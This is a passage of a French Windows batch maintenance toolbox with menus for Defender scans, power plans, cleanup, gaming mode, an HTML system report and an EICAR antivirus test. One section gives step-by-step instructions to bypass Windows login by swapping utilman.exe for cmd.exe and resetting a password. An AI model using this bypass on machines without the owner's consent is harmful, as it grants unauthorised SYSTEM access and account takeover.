█▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄█ █▄▄█';write-host ''}; write-host '  ========================================================================================' -f Cyan;write-host ('   '+$t) -f White;write-host '  ========================================================================================' -f Cyan;write-host (' '.PadRight($pad));$num=1;$printed=0;for($i=0;$i -lt $o.Count;$i++){$parts=$o[$i]-split'~';$s=$parts[0];$d='';if($parts.Count -gt 1){$d=$parts[1]};$isH=($s -match '^\[---');if(-not $isH){$cNum=$num;$num++};if($i -lt $topI -or $printed -ge $maxV){continue};if($isH){write-host (' '.PadRight($pad));$printed++;if($printed -lt $maxV){write-host ('       '+$s).PadRight($pad) -f Cyan;$printed++}}else{$f_str='    ';if($s -match '^\(F\) '){$f_str='(F) ';$s=$s.Substring(4)};if($i -eq $sel[$Idx]){$str='{0}>> [{1}] {2}  ' -f $f_str,$cNum,$s;write-host $str -NoNewline -f Black -b White;$rem=$pad-$str.Length;if($rem -lt 0){$rem=0};$ds=if($d){'   - '+$d}else{''}; if($ds.Length -gt $rem){$ds=$ds.Substring(0,$rem)};write-host $ds.PadRight($rem) -f Yellow}else{$str='{0}   [{1}] {2}  ' -f $f_str,$cNum,$s;write-host $str.PadRight($pad) -f Gray};$printed++}};if($fl -notmatch 'NOCLS'){while($printed -lt $maxV){write-host (' '.PadRight($pad));$printed++};write-host (' '.PadRight($pad))}else{write-host ''};write-host '  ----------------------------------------------------------------------------------------' -f Cyan;$sh='   [FLECHES] Naviguer | [ENTREE] Valider | [F] Favoriser | [S] Rechercher | [0/ECHAP] Retour';if($fl -match 'NONUMS'){$sh='   [FLECHES] Naviguer | [ENTREE] Valider | [ECHAP] Retour'};write-host $sh -NoNewline -f DarkGray};while($true){$target=$sel[$Idx];if($target -lt $topI){$topI=$target};$lines=0;for($i=$topI;$i -le $target;$i++){if($o[$i] -match '^\[---'){$lines+=2}else{$lines+=1}};while($lines -gt $maxV){if($o[$topI] -match '^\[---'){$lines-=2}else{$lines-=1};$topI++};D;$k=$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');$v=$k.VirtualKeyCode;if($v -eq 38){$Idx--;if($Idx -lt 0){$Idx=$sel.Count-1}}elseif($v -eq 40){$Idx++;if($Idx -ge $sel.Count){$Idx=0}}elseif($v -eq 13){if($fl -notmatch 'NOCLS'){clear-host};exit($Idx+1)}elseif($v -eq 27 -or ($fl -notmatch 'NONUMS' -and $k.Character -eq '0')){if($fl -notmatch 'NOCLS'){clear-host};exit 0}elseif($fl -notmatch 'NONUMS' -and $v -eq 70){if($fl -notmatch 'NOCLS'){clear-host};exit(200+$Idx+1)}elseif($fl -notmatch 'NONUMS' -and ($k.Character -eq 'S' -or $k.Character -eq 's')){if($fl -notmatch 'NOCLS'){clear-host};exit 299}elseif($fl -notmatch 'NONUMS' -and [string]$k.Character -match '^[1-9]$' -and [int][string]$k.Character -le $sel.Count){if($fl -notmatch 'NOCLS'){clear-host};exit([int][string]$k.Character)}}"
%PSCMD% -NoProfile -NonInteractive -Command "%ps_cmd%"
set "res=%errorlevel%"
exit /b %res%

:sys_unlock_notes
cls
echo ===============================================
echo   NOTE: Debloquer une session Windows (WinRE)
echo ===============================================
echo.
echo 1^) Demarrer sur une cle USB Windows ^(WinRE/WinPE^) puis ouvrir l'invite de commande.
echo.
echo 2^) Identifier la lettre du disque contenant Windows:
echo    ^> diskpart
echo    ^> list volume
echo    Reperer le volume ou se trouve le dossier \Windows ^(ex: Z:^)
echo.
echo    S'il n'y en a pas ^(pas de lettre sur le volume Windows^):
echo    ^> select volume X
echo    ^> assign letter=Z
echo    ^> exit
echo.
echo 3^) Verifier la presence des fichiers cibles:
echo    ^> dir Z:\windows\system32\cmd.exe
echo    ^> dir Z:\windows\system32\utilman.exe
echo.
echo 4^) Remplacer utilman.exe par cmd.exe ^(sauvegarder si besoin avant^):
echo    ^(Optionnel^) Sauvegarde:
echo    ^> copy Z:\windows\system32\utilman.exe Z:\windows\system32\utilman.exe.bak
echo    Remplacement:
echo    ^> copy Z:\windows\system32\cmd.exe Z:\windows\system32\utilman.exe
echo    Tapez O ^(Oui^) si demande pour remplacer.
echo.
echo 5^) Redemarrer le PC normalement.
echo.
echo 6^) A l'ecran de connexion, cliquer sur le bouton "Ergonomie" ^(facilites d'acces^):
echo    Une fenetre CMD s'ouvre avec privileges systeme.
echo.
echo 7^) Changer le mot de passe du compte desire:
echo    ^> net user nom_utilisateur nouveau_motdepasse
echo    Exemple:
echo    ^> net user martin 123456
echo.
echo 8^) ^(Recommande^) Restaurer utilman.exe d'origine apres recuperation:
echo    ^> copy Z:\windows\system32\utilman.exe.bak Z:\windows\system32\utilman.exe
echo.
echo 9^) Securite:
echo    - N'effectuer ces operations que si vous etes autorise.
echo    - Supprimer la sauvegarde .bak et activer des protections ^(BitLocker, etc.^).
echo.
pause
goto system_tools

REM ===================================================================
REM              GESTIONNAIRE WINDOWS DEFENDER
REM ===================================================================
:sys_defender
call :AutoMenu "GESTIONNAIRE WINDOWS DEFENDER" "wd_quick;wd_full;wd_update;wd_threats;wd_status"
if "%errorlevel%"=="0" (
    if defined diag_back (goto !diag_back!) else (goto system_tools)
)
goto !AutoMenu_Target!

:wd_quick
cls
echo.
echo  [DEFENDER] Lancement du scan rapide...
echo  Appuyez sur Ctrl+C pour interrompre.
echo.
"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -Scan -ScanType 1
echo.
echo  [OK] Scan rapide termine.
pause & goto sys_defender

:wd_full
cls
echo.
echo  [DEFENDER] Lancement du scan COMPLET...
echo  Cela peut prendre 30min a 2h selon le disque.
echo  Appuyez sur Ctrl+C pour interrompre.
echo.
"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -Scan -ScanType 2
echo.
echo  [OK] Scan complet termine.
pause & goto sys_defender

:wd_update
cls
echo.
echo  [DEFENDER] Mise a jour des signatures en cours...
echo.
"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -SignatureUpdate
echo.
echo  [OK] Signatures mises a jour.
pause & goto sys_defender

:wd_threats
cls
echo.
echo  ================================================
echo   MENACES DETECTEES (historique)
echo  ================================================
echo.
powershell -NoProfile -Command "$t=Get-MpThreatDetection -EA SilentlyContinue; if(-not $t){Write-Host '  [OK] Aucune menace detectee !' -f Green}else{$t | Select-Object @{N='Date';E={$_.InitialDetectionTime.ToString('dd/MM HH:mm')}},@{N='Menace';E={(Get-MpThreat -ThreatID $_.ThreatID -EA SilentlyContinue).ThreatName}},@{N='Statut';E={if($_.ActionSuccess){'Neutralisee'}else{'ACTIVE'}}} | Format-Table -AutoSize | Out-String | Write-Host}"
echo.
pause & goto sys_defender

:wd_status
cls
echo.
echo  ================================================
echo   STATUT WINDOWS DEFENDER
echo  ================================================
echo.
powershell -NoProfile -Command "Get-MpComputerStatus -EA SilentlyContinue | Select-Object @{N='Protection TR';E={$_.RealTimeProtectionEnabled}},@{N='Antivirus';E={$_.AntivirusEnabled}},@{N='Antispyware';E={$_.AntispywareEnabled}},@{N='Version Def.';E={$_.AntispywareSignatureVersion}},@{N='Derniere MAJ';E={$_.AntispywareSignatureLastUpdated.ToString('dd/MM/yyyy HH:mm')}} | Format-List | Out-String | Write-Host"
echo.
pause & goto sys_defender

REM ===================================================================
REM              PLAN D'ALIMENTATION
REM ===================================================================
:sys_power_plan
call :AutoMenu "GESTIONNAIRE PLAN D'ALIMENTATION" "pp_balanced;pp_saver;pp_high;pp_ultimate;pp_current;pp_list"
if "%errorlevel%"=="0" goto system_tools
goto !AutoMenu_Target!

:pp_balanced
powercfg /setactive 381b4222-f694-41f0-9685-ff5bb260df2e >nul 2>&1
echo  [OK] Plan Equilibre active.
timeout /t 2 /nobreak >nul & goto sys_power_plan

:pp_saver
powercfg /setactive a1841308-3541-4fab-bc81-f71556f20b4a >nul 2>&1
echo  [OK] Plan Economies d'Energie active.
timeout /t 2 /nobreak >nul & goto sys_power_plan

:pp_high
powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c >nul 2>&1
echo  [OK] Plan Performances Elevees active.
timeout /t 2 /nobreak >nul & goto sys_power_plan

:pp_ultimate
cls
echo.
echo  ================================================
echo   ACTIVATION ULTIMATE PERFORMANCE (mode cache)
echo  ================================================
echo.
echo  Ce plan elimine les micro-latences et desactive
echo  les mecanismes d'economie d'energie.
echo  Ideal pour : Gaming, Creation, Workstation Pro.
echo.
echo  [1/2] Creation du plan (si absent)...
powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul 2>&1
echo  [2/2] Activation du plan Ultimate Performance...
for /f "tokens=4" %%G in ('powercfg /list ^| findstr /i "ultimate\|performances optimales"') do (
    powercfg /setactive %%G >nul 2>&1
)
echo.
echo  [OK] Mode Ultimate Performance ACTIVE !
echo  Visible dans : Parametres > Alimentation et veille > Parametres d'alimentation supplementaires
echo.
pause & goto sys_power_plan

:pp_current
cls
echo.
echo  Plan d'alimentation actif :
powercfg /getactivescheme
echo.
pause & goto sys_power_plan

:pp_list
cls
echo.
echo  Plans d'alimentation disponibles :
powercfg /list
echo.
pause & goto sys_power_plan

REM ===================================================================
REM              MENU DE NETTOYAGE ET OPTIMISATION
REM ===================================================================
:sys_opti_menu
call :AutoMenu "NETTOYEUR ET OPTIMISEUR SYSTEME" "[--- NETTOYAGE ET MAINTENANCE ---];sys_clean_unified;res_clean_browsers;sys_registry_cleanup;[--- OPTIMISATION SYSTEME ---];sys_tweaks_menu;sys_startup_manager"
if "%errorlevel%"=="0" goto system_tools
goto !AutoMenu_Target!

:sys_clean_unified
call :AutoMenu "NETTOYAGE COMPLET UNIFIE" "cl_temp;cl_wu;cl_dns;cl_disk;cl_registry;cl_clipboard;cl_all"
if "%errorlevel%"=="0" goto sys_opti_menu
goto !AutoMenu_Target!

:cl_temp
cls
echo.
echo  [TEMP] Suppression des fichiers temporaires...
del /f /s /q "%temp%\*.*" >nul 2>&1
del /f /s /q "C:\Windows\Temp\*.*" >nul 2>&1
del /f /s /q "C:\Windows\Prefetch\*.*" >nul 2>&1
echo  [CACHE CHROME]...
for /d %%D in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
    if exist "%%D\Cache" rd /s /q "%%D\Cache" >nul 2>&1
)
echo  [CACHE EDGE]...
for /d %%D in ("%LOCALAPPDATA%\Microsoft\Edge\User Data\*") do (
    if exist "%%D\Cache" rd /s /q "%%D\Cache" >nul 2>&1
)
echo  [OK] Fichiers temporaires supprimes.
pause & goto sys_clean_unified

:cl_wu
cls
echo.
echo  [WU] Nettoyage Windows Update en cours...
echo  [1/4] Arret des services...
net stop wuauserv >nul 2>&1
net stop bits >nul 2>&1
echo  [2/4] Suppression du cache SoftwareDistribution...
rd /s /q "C:\Windows\SoftwareDistribution\Download" >nul 2>&1
mkdir "C:\Windows\SoftwareDistribution\Download" >nul 2>&1
echo  [3/4] Nettoyage composants DISM...
DISM /online /Cleanup-Image /StartComponentCleanup >nul 2>&1
echo  [4/4] Redemarrage des services...
net start wuauserv >nul 2>&1
net start bits >nul 2>&1
echo.
echo  [OK] Nettoyage Windows Update termine.
pause & goto sys_clean_unified

:cl_dns
ipconfig /flushdns
echo  [OK] Cache DNS vide.
timeout /t 2 /nobreak >nul & goto sys_clean_unified

:cl_disk
cleanmgr /sageset:65535
cleanmgr /sagerun:65535
goto sys_clean_unified

:cl_registry
cls
echo.
echo  [REGISTRE] Nettoyage en cours...
reg delete "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" /f >nul 2>&1
reg delete "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f >nul 2>&1
echo  [OK] Entrees de registre obsoletes supprimees.
pause & goto sys_clean_unified

:cl_all
cls
echo.
echo  ================================================
echo   NETTOYAGE COMPLET EN COURS...
echo  ================================================
echo.
echo  [1/5] Fichiers temporaires et cache...
del /f /s /q "%temp%\*.*" >nul 2>&1
del /f /s /q "C:\Windows\Temp\*.*" >nul 2>&1
del /f /s /q "C:\Windows\Prefetch\*.*" >nul 2>&1
for /d %%D in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do if exist "%%D\Cache" rd /s /q "%%D\Cache" >nul 2>&1
for /d %%D in ("%LOCALAPPDATA%\Microsoft\Edge\User Data\*") do if exist "%%D\Cache" rd /s /q "%%D\Cache" >nul 2>&1
echo  [OK]
echo  [2/5] Windows Update cache...
net stop wuauserv >nul 2>&1 & net stop bits >nul 2>&1
rd /s /q "C:\Windows\SoftwareDistribution\Download" >nul 2>&1
mkdir "C:\Windows\SoftwareDistribution\Download" >nul 2>&1
DISM /online /Cleanup-Image /StartComponentCleanup >nul 2>&1
net start wuauserv >nul 2>&1 & net start bits >nul 2>&1
echo  [OK]
echo  [3/5] Cache DNS...
ipconfig /flushdns >nul 2>&1
echo  [OK]
echo  [4/5] Registre...
reg delete "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" /f >nul 2>&1
reg delete "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
echo  [OK]
echo  [5/5] Nettoyage Disque Windows...
echo.
echo  ================================================
echo  [OK] Nettoyage complet termine !
echo  Lancement de cleanmgr pour finaliser...
echo  ================================================
echo.
start cleanmgr /sageset:65535
timeout /t 3 /nobreak >nul
cleanmgr /sagerun:65535
goto sys_clean_unified

:cl_clipboard
cls
echo.
echo  [PRESSE-PAPIERS] Vidage complet en cours...
powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::Clear()"
echo off | clip >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Experience" /v "ClipboardHistory" /f >nul 2>&1
powershell -NoProfile -Command "Get-Process -Name 'TextInputHost' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue"
echo  [OK] Presse-papiers et historique entierement vides.
timeout /t 2 /nobreak >nul & goto sys_clean_unified

REM ===================================================================
REM              POINT DE RESTAURATION SYSTEME
REM ===================================================================
:res_restore_point
cls
echo.
echo  ================================================
echo   CREATION D'UN POINT DE RESTAURATION SYSTEME
echo  ================================================
echo.
echo  Activation de la protection systeme si desactivee...
powershell -NoProfile -Command "Enable-ComputerRestore -Drive 'C:\' -ErrorAction SilentlyContinue" >nul 2>&1
echo.
echo  Creation du point de restauration en cours...
echo  (Cela peut prendre 30 a 60 secondes)
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$d = Get-Date -Format 'dd/MM/yyyy HH:mm'; Checkpoint-Computer -Description ('AleexScripts - ' + $d) -RestorePointType 'MODIFY_SETTINGS'; Write-Host '  [OK] Point de restauration cree avec succes !' -ForegroundColor Green"
if %errorlevel% neq 0 (
    echo  [ERREUR] Impossible de creer le point de restauration.
    echo  Verifiez que la protection systeme est activee sur C: dans les
    echo  Proprietes systeme ^> Protection du systeme.
)
echo.
pause
goto sys_rescue_menu

REM ===================================================================
REM              MODE GAMING - BOOST PERFORMANCES
REM ===================================================================
:sys_gaming_mode
cls
set "opts=ACTIVER le Mode Gaming~Desactive les services lourds pour maximiser les FPS;DESACTIVER le Mode Gaming~Reactiver tous les services normaux (retour Windows standard)"
call :DynamicMenu "MODE GAMING - BOOST PERFORMANCES" "%opts%"
set "gm_c=%errorlevel%"
if "%gm_c%"=="0" goto menu_principal
if "%gm_c%"=="1" goto gm_enable
if "%gm_c%"=="2" goto gm_disable
goto sys_gaming_mode

:gm_enable
cls
echo.
echo  ================================================
echo   MODE GAMING - ACTIVATION
echo  ================================================
echo.
echo  [1/6] Arret Windows Update (wuauserv)...
net stop wuauserv >nul 2>&1
echo  [2/6] Arret Indexation des fichiers (WSearch)...
net stop WSearch >nul 2>&1
echo  [3/6] Arret Superfetch / SysMain...
net stop SysMain >nul 2>&1
echo  [4/6] Arret Spooler d'impression (Spooler)...
net stop Spooler >nul 2>&1
echo  [5/6] Arret Connected User Experiences (DiagTrack)...
net stop DiagTrack >nul 2>&1
echo  [6/6] Activation du plan Performances Elevees...
powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c >nul 2>&1
echo.
echo  ================================================
echo   [OK] MODE GAMING ACTIVE !
echo   Tous les services lourds ont ete stoppes.
echo   Les performances CPU/GPU sont maximisees.
echo.
echo   ATTENTION : Relancez ce menu pour DESACTIVER
echo   le mode Gaming quand vous avez fini de jouer.
echo  ================================================
echo.
pause
goto sys_gaming_mode

:gm_disable
cls
echo.
echo  ================================================
echo   MODE GAMING - DESACTIVATION
echo  ================================================
echo.
echo  [1/6] Redemarrage Windows Update (wuauserv)...
net start wuauserv >nul 2>&1
echo  [2/6] Redemarrage Indexation des fichiers (WSearch)...
net start WSearch >nul 2>&1
echo  [3/6] Redemarrage Superfetch / SysMain...
net start SysMain >nul 2>&1
echo  [4/6] Redemarrage Spooler d'impression...
net start Spooler >nul 2>&1
echo  [5/6] Redemarrage DiagTrack...
net start DiagTrack >nul 2>&1
echo  [6/6] Retour au plan d'alimentation Equilibre...
powercfg /setactive 381b4222-f694-41f0-9685-ff5bb260df2e >nul 2>&1
echo.
echo  ================================================
echo   [OK] MODE GAMING DESACTIVE !
echo   Tous les services ont ete restaures normalement.
echo  ================================================
echo.
pause
goto sys_gaming_mode

REM ===================================================================
REM              RAPPORT COMPLET TOUT-EN-UN (HTML)
REM ===================================================================
:sys_full_report
cls
echo.
echo  ================================================
echo   RAPPORT COMPLET TOUT-EN-UN
echo  ================================================
echo.
echo  Generation du rapport HTML complet...
echo  Collecte : Systeme, Disques, Reseau, Users, Logiciels
echo.
set "RPT=%USERPROFILE%\Desktop\Rapport_PC_%COMPUTERNAME%_%DATE:~6,4%-%DATE:~3,2%-%DATE:~0,2%.html"
set "RPT_PS=%TEMP%\full_report.ps1"
if exist "%RPT_PS%" del "%RPT_PS%"
>  "%RPT_PS%" echo $f='%USERPROFILE%\Desktop\Rapport_PC_%COMPUTERNAME%.html'
>> "%RPT_PS%" echo $nl=[Environment]::NewLine
>> "%RPT_PS%" echo $now=Get-Date -Format 'dd/MM/yyyy HH:mm'
>> "%RPT_PS%" echo $cn=$env:COMPUTERNAME
>> "%RPT_PS%" echo $os=(Get-CimInstance Win32_OperatingSystem)
>> "%RPT_PS%" echo $cpu=(Get-CimInstance Win32_Processor).Name.Trim()
>> "%RPT_PS%" echo $ram=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)
>> "%RPT_PS%" echo $gpu=(Get-CimInstance Win32_VideoController ^| Select-Object -First 1).Name
>> "%RPT_PS%" echo $disks=Get-PSDrive -PSProvider FileSystem ^| Where-Object {$_.Used -ne $null}
>> "%RPT_PS%" echo $diskHtml=($disks ^| ForEach-Object { $u=[math]::Round($_.Used/1GB,1); $f2=[math]::Round($_.Free/1GB,1); $t=[math]::Round(($_.Used+$_.Free)/1GB,1); $pct=if($t -gt 0){[math]::Round($_.Used/($_.Used+$_.Free)*100)}else{0}; $bar='#'*[math]::Round($pct/5)+'.'*(20-[math]::Round($pct/5)); '^<tr^>^<td^>' + $_.Name + ':^</td^>^<td^>' + $u + ' Go utilise / ' + $t + ' Go total^</td^>^<td^>^<span style=''color:' + (if($pct -gt 90){'red'}elseif($pct -gt 70){'orange'}else{'green'}) + '''^>^[' + $bar + '] ' + $pct + '%%^</span^>^</td^>^</tr^>' }) -join ''
>> "%RPT_PS%" echo $ips=(Get-NetIPAddress -AddressFamily IPv4 -EA SilentlyContinue ^| Where-Object {$_.IPAddress -ne '127.0.0.1'} ^| ForEach-Object {'^<li^>' + $_.InterfaceAlias + ' : ^<b^>' + $_.IPAddress + '^</b^>^</li^>'}) -join ''
>> "%RPT_PS%" echo $wifi=(netsh wlan show interfaces 2^>$null ^| Select-String 'SSID' ^| Select-Object -First 1)
>> "%RPT_PS%" echo $wifiName=if($wifi){($wifi -split ':')[1].Trim()}else{'Non connecte'}
>> "%RPT_PS%" echo $apps=(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' -EA SilentlyContinue ^| Where-Object {$_.DisplayName} ^| Sort-Object DisplayName ^| Select-Object DisplayName,DisplayVersion -Unique)
>> "%RPT_PS%" echo $appHtml=($apps ^| ForEach-Object {'^<tr^>^<td^>' + $_.DisplayName + '^</td^>^<td^>' + $_.DisplayVersion + '^</td^>^</tr^>'}) -join ''
>> "%RPT_PS%" echo $users=(Get-LocalUser -EA SilentlyContinue ^| ForEach-Object {'^<tr^>^<td^>' + $_.Name + '^</td^>^<td^>' + (if($_.Enabled){'Actif'}else{'Desactive'}) + '^</td^>^<td^>' + $_.LastLogon + '^</td^>^</tr^>'}) -join ''
>> "%RPT_PS%" echo $errs=(Get-WinEvent -FilterHashtable @{LogName='System';Level=1,2;StartTime=(Get-Date).AddDays(-7)} -EA SilentlyContinue ^| Select-Object -First 20 ^| ForEach-Object {'^<tr^>^<td^>' + $_.TimeCreated.ToString('dd/MM HH:mm') + '^</td^>^<td^>' + $_.Id + '^</td^>^<td^>' + $_.ProviderName + '^</td^>^<td^>' + $_.Message.Split([char]10)[0].Trim().Substring(0,[math]::Min(80,$_.Message.Length)) + '^</td^>^</tr^>'}) -join ''
>> "%RPT_PS%" echo $html='^<!DOCTYPE html^>^<html lang=''fr''^>^<head^>^<meta charset=''UTF-8''^>^<title^>Rapport PC - ' + $cn + '^</title^>^<style^>body{font-family:Segoe UI,sans-serif;background:#0d1117;color:#e6edf3;margin:0;padding:20px}h1{color:#58a6ff;border-bottom:2px solid #1f6feb;padding-bottom:10px}h2{color:#79c0ff;margin-top:30px;background:#161b22;padding:10px;border-radius:6px}table{width:100%%;border-collapse:collapse;margin:10px 0}th{background:#1f6feb;color:white;padding:8px;text-align:left}td{padding:6px 8px;border-bottom:1px solid #21262d}tr:hover{background:#1c2128}.badge{display:inline-block;padding:3px 8px;border-radius:12px;font-size:12px;background:#1f6feb}.info{background:#161b22;padding:15px;border-radius:8px;margin:10px 0;border-left:4px solid #1f6feb}^</style^>^</head^>^<body^>^<h1^>Rapport PC - ' + $cn + '^</h1^>^<div class=''info''^>^<b^>Genere le :^</b^> ' + $now + ' ^&nbsp;^|^&nbsp; ^<b^>OS :^</b^> ' + $os.Caption + ' ' + $os.Version + ' ^&nbsp;^|^&nbsp; ^<b^>Uptime :^</b^> ' + ([math]::Round((New-TimeSpan $os.LastBootUpTime (Get-Date)).TotalHours,1)) + 'h^</div^>^<h2^>Materiel^</h2^>^<table^>^<tr^>^<th^>Composant^</th^>^<th^>Detail^</th^>^</tr^>^<tr^>^<td^>CPU^</td^>^<td^>' + $cpu + '^</td^>^</tr^>^<tr^>^<td^>RAM^</td^>^<td^>' + $ram + ' Go^</td^>^</tr^>^<tr^>^<td^>GPU^</td^>^<td^>' + $gpu + '^</td^>^</tr^>^<tr^>^<td^>Wi-Fi^</td^>^<td^>' + $wifiName + '^</td^>^</tr^>^</table^>^<h2^>Disques^</h2^>^<table^>^<tr^>^<th^>Lecteur^</th^>^<th^>Utilisation^</th^>^<th^>Occupation^</th^>^</tr^>' + $diskHtml + '^</table^>^<h2^>Reseau^</h2^>^<ul^>' + $ips + '^</ul^>^<h2^>Comptes Utilisateurs^</h2^>^<table^>^<tr^>^<th^>Utilisateur^</th^>^<th^>Statut^</th^>^<th^>Derniere connexion^</th^>^</tr^>' + $users + '^</table^>^<h2^>Logiciels Installes (' + $apps.Count + ')^</h2^>^<table^>^<tr^>^<th^>Logiciel^</th^>^<th^>Version^</th^>^</tr^>' + $appHtml + '^</table^>^<h2^>Erreurs Systeme (7 derniers jours)^</h2^>^<table^>^<tr^>^<th^>Date^</th^>^<th^>ID^</th^>^<th^>Source^</th^>^<th^>Message^</th^>^</tr^>' + $errs + '^</table^>^</body^>^</html^>'
>> "%RPT_PS%" echo $html ^| Out-File $f -Encoding UTF8
>> "%RPT_PS%" echo Write-Host ('  [OK] Rapport genere : ' + $f) -f Green
powershell -NoProfile -ExecutionPolicy Bypass -File "%RPT_PS%"
if exist "%RPT_PS%" del "%RPT_PS%" >nul 2>&1
echo.
echo  [OK] Rapport HTML genere sur le Bureau !
powershell -Command "Start-Process '%USERPROFILE%\Desktop\Rapport_PC_%COMPUTERNAME%.html'"
echo.
pause
goto system_tools

REM ===================================================================
REM         RACCOURCIS BUREAU 1-CLIC (REDEMARRER / ETEINDRE)
REM ===================================================================
:sys_shortcuts_bureau
cls
set "opts=Creer raccourci REDEMARRER~Icone rouge sur le Bureau pour redemarrer en 1 clic;Creer raccourci ETEINDRE~Icone bleue sur le Bureau pour eteindre en 1 clic;Creer les DEUX raccourcis~Redemarrer + Eteindre en une seule action;Supprimer les raccourcis~Retirer les raccourcis crees du Bureau"
call :DynamicMenu "RACCOURCIS BUREAU 1-CLIC" "%opts%"
set "sc_c=%errorlevel%"
if "%sc_c%"=="0" goto menu_principal
if "%sc_c%"=="1" goto sc_restart
if "%sc_c%"=="2" goto sc_shutdown
if "%sc_c%"=="3" call :sc_do_restart & call :sc_do_shutdown & goto sc_done_both
if "%sc_c%"=="4" goto sc_delete
goto sys_shortcuts_bureau

:sc_restart
call :sc_do_restart
goto sc_done_restart

:sc_shutdown
call :sc_do_shutdown
goto sc_done_shutdown

:sc_do_restart
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$desk=$env:USERPROFILE+'\Desktop';" ^
    "$ws=New-Object -ComObject WScript.Shell;" ^
    "$sc=$ws.CreateShortcut($desk+'\  Redemarrer le PC.lnk');" ^
    "$sc.TargetPath='shutdown.exe';" ^
    "$sc.Arguments='/r /t 0';" ^
    "$sc.Description='Redemarrer le PC immediatement';" ^
    "$sc.IconLocation='%SystemRoot%\System32\shell32.dll,238';" ^
    "$sc.WindowStyle=7;" ^
    "$sc.Save();" ^
    "Write-Host '  [OK] Raccourci Redemarrer cree sur le Bureau.' -f Green"
exit /b

:sc_do_shutdown
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$desk=$env:USERPROFILE+'\Desktop';" ^
    "$ws=New-Object -ComObject WScript.Shell;" ^
    "$sc=$ws.CreateShortcut($desk+'\  Eteindre le PC.lnk');" ^
    "$sc.TargetPath='shutdown.exe';" ^
    "$sc.Arguments='/s /t 0';" ^
    "$sc.Description='Eteindre le PC immediatement';" ^
    "$sc.IconLocation='%SystemRoot%\System32\shell32.dll,27';" ^
    "$sc.WindowStyle=7;" ^
    "$sc.Save();" ^
    "Write-Host '  [OK] Raccourci Eteindre cree sur le Bureau.' -f Green"
exit /b

:sc_done_restart
cls
echo.
echo  ================================================
echo   RACCOURCI "REDEMARRER" CREE
echo  ================================================
echo.
echo  [OK] Fichier : Bureau \  Redemarrer le PC.lnk
echo  [OK] Action  : shutdown /r /t 0 (immediat)
echo  [OK] Icone   : Icone systeme (fleche rouge)
echo.
echo  Double-cliquez sur le raccourci pour redemarrer.
echo.
pause
goto sys_shortcuts_bureau

:sc_done_shutdown
cls
echo.
echo  ================================================
echo   RACCOURCI "ETEINDRE" CREE
echo  ================================================
echo.
echo  [OK] Fichier : Bureau \  Eteindre le PC.lnk
echo  [OK] Action  : shutdown /s /t 0 (immediat)
echo  [OK] Icone   : Icone systeme (bouton power)
echo.
echo  Double-cliquez sur le raccourci pour eteindre.
echo.
pause
goto sys_shortcuts_bureau

:sc_done_both
cls
echo.
echo  ================================================
echo   RACCOURCIS CREES AVEC SUCCES !
echo  ================================================
echo.
echo  [OK]   Redemarrer le PC.lnk  (icone fleche)
echo  [OK]   Eteindre le PC.lnk   (icone power)
echo.
echo  Les deux raccourcis sont sur votre Bureau.
echo  Double-cliquez pour l'action immediate.
echo.
pause
goto sys_shortcuts_bureau

:sc_delete
cls
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$desk=$env:USERPROFILE+'\Desktop';" ^
    "$files=@('  Redemarrer le PC.lnk','  Eteindre le PC.lnk');" ^
    "foreach($f in $files){" ^
    "  $p=$desk+'\'+$f;" ^
    "  if(Test-Path $p){Remove-Item $p -Force; Write-Host ('  [OK] Supprime : '+$f) -f Green}" ^
    "  else{Write-Host ('  [--] Non trouve : '+$f) -f DarkGray}" ^
    "}"
echo.
pause
goto sys_shortcuts_bureau

REM ===================================================================
REM         TEST ANTIVIRUS - SCRIPTS AUTO-DECOMPRESSABLES 
REM ===================================================================
:sys_av_test
call :AutoMenu "TEST ANTIVIRUS - SCRIPTS LANCEURS" "av_launcher_eicar;av_launcher_heur;av_clean"
if "%errorlevel%"=="0" goto menu_principal
goto !AutoMenu_Target!

:av_launcher_eicar
cls
echo.
echo  ================================================
echo   TEST EN DIRECT : SIGNATURE VIRALE (EICAR)
echo  ================================================
echo.
set "AVTEST_DIR=%USERPROFILE%\Desktop\Test_Antivirus"
if not exist "%AVTEST_DIR%" mkdir "%AVTEST_DIR%"

echo  [ACTION] Construction de la signature virale (Fichier inoffensif)...
echo  L'Antivirus de Windows va formellement intercepter ce fichier.
echo.
echo  Creation du fichier dans : Bureau\Test_Antivirus\eicar_test.txt
echo.
echo 58 35 4f 21 50 25 40 41 50 5b 34 5c 50 5a 58 35 34 28 50 5e 29 37 43 43 29 37 7d 24 > "%TEMP%\hx.txt"
